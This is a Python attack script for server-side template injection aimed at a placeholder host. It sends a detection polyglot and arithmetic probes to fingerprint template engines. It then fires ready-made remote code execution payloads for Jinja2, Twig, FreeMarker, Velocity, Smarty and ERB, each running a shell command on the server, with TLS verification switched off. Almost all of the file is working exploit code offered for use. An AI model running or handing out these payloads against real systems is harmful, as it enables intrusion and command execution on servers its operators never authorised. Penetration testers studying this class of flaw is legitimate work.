#!/usr/bin/env python3
"""Server-Side Template Injection (SSTI): detection, engine fingerprinting,
and ready-to-use RCE payloads for the common engines."""

import requests

requests.packages.urllib3.disable_warnings()

BASE_URL = "https://target.local"
SESSION = requests.Session()

DETECTION_POLYGLOT = "${{<%[%'\"}}%\\."

ARITHMETIC_PROBES = {
    "jinja2/twig": "{{7*7}}",
    "freemarker": "${7*7}",
    "velocity": "#set($x=7*7)$x",
    "erb": "<%= 7*7 %>",
    "smarty": "{7*7}",
}

RCE_PAYLOADS = {
    "jinja2": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
    "jinja2_cycler": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
    "twig": "{{ ['id']|filter('system') }}",
    "freemarker": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
    "velocity": "#set($e=$x.class.forName('java.lang.Runtime').getRuntime().exec('id'))",
    "smarty": "{system('id')}",
    "erb": "<%= `id` %>",
}


def inject(param: str, value: str, method: str = "GET") -> requests.Response:
    """Send a payload through one parameter and return the response."""
    if method.upper() == "GET":
        return SESSION.get(f"{BASE_URL}/", params={param: value}, verify=False, timeout=10)
    return SESSION.post(f"{BASE_URL}/", data={param: value}, verify=False, timeout=10)


def fingerprint_engine(param: str, method: str = "GET") -> str | None:
    """Try each arithmetic probe and report the engine whose '49' shows up."""
    for engine, probe in ARITHMETIC_PROBES.items():
        r = inject(param, probe, method)
        if "49" in r.text:
            print(f"[+] Likely engine: {engine} (probe {probe!r} -> 49)")
            return engine
    print("[-] No arithmetic evaluation detected (reflected literally -> probably XSS, not SSTI)")
    return None


def exploit_rce(param: str, engine: str, method: str = "GET") -> str:
    """Send the RCE payload for a given engine and print the response body."""
    payload = RCE_PAYLOADS[engine]
    r = inject(param, payload, method)
    print(r.status_code, r.text[:500])
    return r.text


if __name__ == "__main__":
    pass
